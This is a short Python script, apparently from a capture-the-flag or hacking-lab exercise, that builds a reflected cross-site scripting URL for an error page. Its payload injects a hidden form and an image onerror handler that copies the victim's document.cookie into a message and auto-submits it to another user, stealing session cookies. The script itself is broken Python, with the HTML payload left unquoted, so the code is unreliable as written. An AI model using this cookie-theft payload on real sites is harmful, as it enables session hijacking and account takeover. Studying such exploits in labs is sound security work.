from urllib.parse import urlencode


webpage = "https://obxssession.is.hackthe.space/error?m=theory%20is%20private&p=/theory/5"
script = <form name = "Attack" action="/send" method="POST" <input name="subject" value="subject random"> <input name="receiver" value=66> <input name="contents" value="some random message"> </form><img src=/ onerror="document.Attack.contents.value = document.cookie;document.Attack.submit();"></img>


scriptEncripted = urlencode({"p": script})
#scriptEncripted = "%3Cscript%3Ealert%28%221%21%22%29%3C%2Fscript%3E"
#'https://example.org/path?theparam=I+can+place+%3C%3E+here'

payload = webpage+"&"+scriptEncripted
print(payload)


"https://obxssession.is.hackthe.space/error?m=&{alert(‘hello’);}&p=/theory/5"







